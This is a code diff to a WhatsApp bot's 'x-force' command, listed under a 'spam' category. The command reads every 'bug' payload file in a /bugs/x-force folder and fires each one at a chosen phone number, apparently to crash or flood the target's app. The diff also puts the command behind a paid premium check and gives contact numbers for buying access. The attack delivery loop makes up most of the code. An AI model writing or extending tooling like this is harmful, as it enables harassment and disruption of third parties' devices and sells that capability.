@@ -2,17 +2,29 @@ const { cmd } = require('../command');
 const config = require('../config');
 const fs = require('fs');
 const path = require('path');
+const { isPremium } = require('../lib/premium');
 
 cmd({
   pattern: 'x-force',
-  desc: 'Send all text payloads from /bugs/x-force folder to a target number',
+  desc: 'Send all text payloads from /bugs/x-force folder to a target number (Premium only)',
   category: 'spam',
   react: '⚡',
   filename: __filename
 }, async (bot, mek, m, { from, reply }) => {
   try {
-    const prefix = config.PREFIX;
+    const sender = m.sender.split('@')[0];
 
+    if (!isPremium(sender)) {
+      return await bot.sendMessage(from, {
+        text: `🚫 *Premium only feature!*
+
+Your access may have expired.
+💰 To buy 5-day premium ($5):
+📞 wa.me/13058962443 or wa.me/50942241547`
+      }, { quoted: mek });
+    }
+
+    const prefix = config.PREFIX;
     const body = m.body || '';
     const cmdName = body.startsWith(prefix)
       ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
@@ -40,14 +52,14 @@ cmd({
     if (!fs.existsSync(bugsDir)) {
       return await bot.sendMessage(from, { text: '📁 The folder /bugs/x-force does not exist.' }, { quoted: mek });
     }
-    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
 
+    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
     if (bugFiles.length === 0) {
       return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs/x-force.' }, { quoted: mek });
     }
 
     await bot.sendMessage(from, {
-      text: `🚀 Sending ${bugFiles.length} payloads from /bugs/x-force to number: +${targetNumber}`
+      text: `🚀 Sending ${bugFiles.length} payloads to +${targetNumber}`
     }, { quoted: mek });
 
     for (const file of bugFiles) {
@@ -55,33 +67,26 @@ cmd({
         const payloadPath = path.join(bugsDir, file);
         let bugPayload = require(payloadPath);
 
-        // If it's an object with default string export
         if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
-          const msg = bugPayload.default;
-          await bot.sendMessage(targetJid, { text: msg });
-        }
-        // If it's a plain string export
-        else if (typeof bugPayload === 'string') {
+          await bot.sendMessage(targetJid, { text: bugPayload.default });
+        } else if (typeof bugPayload === 'string') {
           await bot.sendMessage(targetJid, { text: bugPayload });
-        }
-        // If it's an async function export
-        else if (typeof bugPayload === 'function') {
+        } else if (typeof bugPayload === 'function') {
           await bugPayload(bot, targetNumber);
-        }
-        else {
-          await bot.sendMessage(targetJid, { text: `Payload in ${file} is in an unrecognized format.` });
+        } else {
+          await bot.sendMessage(targetJid, { text: `⚠️ Invalid payload format in ${file}` });
         }
 
       } catch (e) {
-        console.error(`❌ Error sending ${file}:`, e.message);
+        console.error(`❌ Error in ${file}:`, e.message);
         await bot.sendMessage(targetJid, { text: `❌ Error sending ${file}: ${e.message}` });
       }
 
-      await new Promise(res => setTimeout(res, 1000)); // 1 second delay between each message (adjustable)
+      await new Promise(res => setTimeout(res, 1000)); // 1 second delay
     }
 
     await bot.sendMessage(from, {
-      text: `✅ Finished sending all payloads in /bugs/x-force to +${targetNumber}`
+      text: `✅ Finished sending all payloads to +${targetNumber}`
     }, { quoted: mek });
 
   } catch (err) {
